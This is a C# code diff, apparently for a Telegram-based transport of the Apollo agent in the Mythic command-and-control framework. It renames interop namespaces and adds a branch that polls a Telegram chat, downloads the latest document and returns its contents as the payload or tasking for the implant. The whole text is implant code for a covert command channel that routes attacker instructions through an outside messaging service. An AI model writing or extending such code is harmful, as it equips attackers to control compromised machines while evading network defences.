@@ -1,12 +1,12 @@
 using System;
 using System.Collections.Generic;
 using System.Runtime.Serialization;
-using AgInterop.Classes;
-using AgInterop.Enums.AgCoreEnums;
-using AgInterop.Interfaces;
-using AgInterop.Serializers;
-using AgInterop.Structs.MythicStructs;
-using AgInterop.Types.Delegates;
+using ApolloInterop.Classes;
+using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Serializers;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Types.Delegates;
 
 namespace TelegramTransport
 {
@@ -228,6 +228,22 @@ namespace TelegramTransport
                         StringComparison.Ordinal);
                     bool isPushedTasking = string.IsNullOrEmpty(envelope.ReplyToPacketId);
                     string assembled;
+
+                    // document delivery: the payload is in a previously sent document
+                    if (envelope.Message == "DOC" && completesRequest)
+                    {
+                        // find the most recent document in the chat
+                        TelegramUpdate[] docUpdates = _telegram.GetUpdates(0);
+                        foreach (TelegramUpdate docUpdate in docUpdates)
+                        {
+                            var doc = docUpdate.Message?.Document;
+                            if (doc == null || string.IsNullOrWhiteSpace(doc.FileId)) continue;
+                            byte[]? docData = _telegram.DownloadDocument(doc.FileId);
+                            if (docData != null) { correlatedPayload = System.Text.Encoding.UTF8.GetString(docData); break; }
+                        }
+                        if (correlatedPayload != null) { return correlatedPayload; }
+                        continue;
+                    }
                     if ((!completesRequest && !isPushedTasking) ||
                         !_assembler.TryAdd(envelope, out assembled))
                     {
